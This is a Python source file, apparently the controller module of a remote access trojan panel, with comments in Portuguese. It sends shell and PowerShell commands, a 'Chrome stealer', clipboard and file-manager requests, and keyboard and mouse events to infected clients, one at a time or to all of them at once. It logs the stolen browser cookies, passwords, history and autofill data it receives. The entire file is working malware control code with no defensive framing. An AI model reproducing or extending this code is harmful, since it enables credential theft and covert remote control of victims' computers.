import datetime
import json
from tcpmanager import send_to, get_log
from panel import logbox

def log_event(cid, msg):
    now = datetime.datetime.now().strftime("[%H:%M:%S]")
    logbox.insert("end", f"{now} <CLIENT {cid}> {msg}\n")
    logbox.see("end")

def parse_command(cid, raw):
    # Recebe comandos do painel, repassa para client, loga no painel
    try:
        if raw.startswith("CMD:"):
            cmd = raw[4:]
            send_to(cid, raw.encode())
            log_event(cid, f"CMD sent: {cmd}")
        elif raw.startswith("PS:"):
            ps = raw[3:]
            send_to(cid, raw.encode())
            log_event(cid, f"PowerShell sent: {ps}")
        elif raw.startswith("CHROME:"):
            send_to(cid, raw.encode())
            log_event(cid, "Chrome stealer invoked")
        elif raw.startswith("CLIP:"):
            send_to(cid, raw.encode())
            log_event(cid, "Clipboard requested")
        elif raw.startswith("FILEMANAGER:"):
            send_to(cid, raw.encode())
            log_event(cid, "File manager requested")
        elif raw.startswith("KEYBOARD:"):
            send_to(cid, raw.encode())
            log_event(cid, f"Keyboard event: {raw}")
        elif raw.startswith("MOUSE:"):
            send_to(cid, raw.encode())
            log_event(cid, f"Mouse event: {raw}")
        else:
            send_to(cid, raw.encode())
            log_event(cid, f"Unknown raw command sent: {raw}")
    except Exception as e:
        log_event(cid, f"Error sending command: {str(e)}")

def handle_response(cid, data):
    # Recebe resposta do cliente, processa de acordo (output, logs, etc)
    if len(data)>0:
        try:
            # Testa se é json (chrome, clipboard, fileman)
            try:
                parsed = json.loads(data.decode(errors="ignore"))
                if "cookies" in parsed:
                    log_event(cid, f"Cookies stolen: {len(parsed['cookies'])} entries")
                elif "logins" in parsed:
                    log_event(cid, f"Passwords stolen: {len(parsed['logins'])} entries")
                elif "history" in parsed:
                    log_event(cid, f"History stolen: {len(parsed['history'])} entries")
                elif "autofill" in parsed:
                    log_event(cid, f"Autofills: {len(parsed['autofill'])} entries")
                elif "clipboard" in parsed:
                    log_event(cid, f"Clipboard: {parsed['clipboard']}")
                elif "filelist" in parsed:
                    log_event(cid, f"Files: {parsed['filelist']}")
                else:
                    log_event(cid, f"Other structured data: {parsed}")
            except:
                # Não é json — output RAW (CMD/PS/log)
                txt = data.decode(errors="ignore").strip()
                log_event(cid, txt)
        except Exception as e:
            log_event(cid, f"Response parse error: {str(e)}")

def broadcast_command(raw):
    # Envia comando para todos clientes do pool
    from tcpmanager import CLIENTS
    for cid in CLIENTS.keys():
        parse_command(cid, raw)

def log_full(cid):
    # Mostra log completo do cliente
    logs = get_log(cid)
    for entry in logs:
        logbox.insert("end", f"<{cid}> {entry}\n")
    logbox.see("end")